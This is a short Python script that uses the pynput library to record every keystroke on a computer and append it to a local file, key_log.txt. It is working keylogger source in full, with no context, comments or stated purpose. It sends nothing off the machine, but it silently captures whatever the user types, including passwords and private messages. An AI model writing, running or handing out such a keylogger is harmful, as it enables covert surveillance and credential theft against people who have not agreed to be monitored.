from pynput import keyboard

def on_press(key):
    with open("key_log.txt", "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f"{key}")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()